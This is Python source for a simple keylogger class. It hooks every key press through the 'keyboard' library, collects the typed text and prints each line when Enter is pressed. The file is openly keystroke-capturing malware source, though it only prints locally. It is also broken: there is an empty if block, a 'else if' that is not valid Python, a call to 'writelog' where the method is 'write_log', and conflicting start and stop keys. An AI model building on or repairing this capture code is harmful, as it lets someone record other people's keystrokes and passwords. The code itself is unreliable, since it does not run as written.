import keyboard
from threading import Semaphore

class Keylogger:
	def __init__(self):
		self.log = ""
		self.semaphore = Semaphore(0)
		self.recording = False
	
	def callback(self, event):
		name = event.name
		
		if self.recording:
		
		else:
			if name == "enter":
				self.recording = True
			else if name == "ctrl+q":
				self.semaphore.release()
		
		if len(name) > 1:
			if name == "space": name = " "
			elif name == "enter":
				self.log += "\n"
				self.writelog()
				name = ""
				self.log = ""
			elif name == "decimal": name = "."
			elif name == "esc": 
				self.semaphore.release()
		
		self.log += name
	
	def write_log(self):
		print(self.log)
	
	def start(self):
		keyboard.on_press(callback=self.callback)
		self.semaphore.acquire()

if __name__ == "__main__":
	keylogger = Keylogger()
	keylogger.start()
		
